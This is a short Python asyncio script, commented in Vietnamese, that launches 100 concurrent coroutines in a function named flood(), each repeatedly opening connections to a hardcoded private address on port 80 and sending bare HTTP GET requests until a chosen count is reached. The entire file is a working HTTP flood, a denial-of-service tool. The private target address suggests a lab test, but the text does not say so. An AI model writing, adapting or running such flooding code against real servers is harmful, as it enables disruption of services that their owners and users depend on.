import asyncio
import sys

target_host = "192.168.100.1"
target_port = 80
http_request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n".encode()

# đọc số request từ tham số dòng lệnh
if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} <num_requests>")
    sys.exit(1)

total_requests = int(sys.argv[1])
counter = 0

async def flood():
    global counter
    while True:
        if counter >= total_requests:
            return
        try:
            reader, writer = await asyncio.open_connection(target_host, target_port)
            writer.write(http_request)
            await writer.drain()
            writer.close()
            await writer.wait_closed()
            counter += 1
        except Exception:
            pass

async def main(connections=100):
    tasks = []
    for _ in range(connections):
        tasks.append(asyncio.create_task(flood()))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main(100))  # chạy 100 coroutine song song
    except KeyboardInterrupt:
        print("Stopped by user")
